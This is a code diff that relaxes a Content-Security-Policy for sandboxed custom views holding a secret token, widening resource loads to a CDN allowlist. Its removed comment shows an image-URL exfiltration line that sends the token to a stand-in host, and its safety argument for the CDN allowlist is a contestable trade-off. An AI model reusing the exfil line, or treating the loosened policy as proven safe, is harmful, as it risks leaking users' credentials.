@@ -66,33 +66,31 @@ export function buildHtmlPreviewCsp(origin?: string, cdns: readonly string[] = H
 
 /**
  * CSP for a custom collection view (see plans/feat-collections-custom-views.md).
+ * Same policy as the preview header EXCEPT `connect-src` is the server origin
+ * (not `'none'`): a custom view legitimately `fetch()`es its collection's data
+ * endpoint.
  *
- * Unlike the preview policy, a custom view is handed a **secret** — the scoped
- * capability token in `window.__MC_VIEW.token` — plus the collection's records.
- * That changes the threat model: ANY third-party resource destination becomes
- * an exfiltration channel, because the token/data can ride out in a request URL
- * (`new Image().src = "https://cdn.example/x?" + token`) and `connect-src` does
- * NOT govern script/style/font/img loads. So this policy allows **no
- * third-party hosts at all** (no CDN allowlist):
- *   - `script-src` / `style-src`: inline only.
- *   - `img-src` / `font-src`: same-origin + `data:` / `blob:` only — same-origin
- *     can only reach our own (loopback) server, never an attacker.
- *   - `connect-src`: the server origin only — the view fetches its data endpoint
- *     and nothing else.
+ * Threat model — a custom view is handed a scoped token (`window.__MC_VIEW`) +
+ * the collection's records, so we must prevent exfiltration to an attacker:
+ *   - **`connect-src` = the server origin only.** This is the channel that
+ *     matters: fetch / XHR / WebSocket / sendBeacon / EventSource to an
+ *     arbitrary host is what lets a malicious view stream the token/data out.
+ *     Locked to the origin, the view can reach ONLY its own data endpoint.
+ *   - **Resource loads (`script`/`style`/`font`/`img`) reuse the curated CDN
+ *     allowlist.** A `<… src="https://cdn/x?token">` request does reach that
+ *     host, but the allowlist is reputable infrastructure (jsdelivr / unpkg /
+ *     cdnjs / Google Fonts / plotly) that does NOT expose per-request logs to
+ *     third parties, so the token lands in the CDN's logs, never an attacker's.
+ *     The allowlist-exfil bypass needs an attacker-CONTROLLABLE allowed host
+ *     (open redirect, logging endpoint, attacker subdomain); none here qualify.
+ *     This also lets views use charting libs (Chart.js, Plotly, D3) from a CDN.
  *
  * `origin` MUST be the explicit server origin: the sandboxed iframe has an
  * opaque origin, so `'self'` would never match (same reason the preview policy
  * substitutes the origin into `img-src`).
  */
-export function buildCustomViewCsp(origin: string): string {
-  return [
-    "default-src 'none'",
-    "script-src 'unsafe-inline'",
-    "style-src 'unsafe-inline'",
-    `img-src ${origin} data: blob:`,
-    "font-src data:",
-    `connect-src ${origin}`,
-  ].join("; ");
+export function buildCustomViewCsp(origin: string, cdns: readonly string[] = HTML_PREVIEW_CSP_ALLOWED_CDNS): string {
+  return buildCsp(origin, origin, cdns);
 }
 
 /**
